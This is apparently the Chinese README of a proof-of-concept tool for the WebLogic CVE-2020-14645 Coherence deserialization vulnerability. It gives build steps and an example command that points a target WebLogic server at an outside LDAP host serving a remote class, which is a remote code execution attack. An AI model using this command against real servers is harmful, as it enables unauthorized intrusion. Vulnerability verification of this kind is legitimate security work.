# Weblogic CVE-2020-14645 coherence 反序列化漏洞验证程序

## 环境

- Maven 3

- JDK 1.8

## 编译

```
mvn package
```

## 使用

具体的测试测试方法请看 [这里](https://github.com/DSO-Lab/Dubbo-CVE-2020-1948/wiki)。

### 测试程序执行方法

```
java -jar target/CVE-2020-14645.jar LDAP_IP:LDAP_PORT/#CLASS_NAME WEBLOGIC_URL

# 示例
java -jar target/CVE-2020-14645.jar 1.1.1.1:8080/#exp http://127.0.0.1:7001
java -jar target/CVE-2020-14645.jar 1.1.1.1:8080/#exp https://127.0.0.1:7002
```

## 鸣谢

本项目参考和引用了项目 [@Y4er](https://github.com/Y4er) [@5up3rc](https://github.com/5up3rc) 的部分代码，特此感谢！

# 参考资料

https://github.com/Y4er/CVE-2020-14645

https://github.com/5up3rc/weblogic_cmd

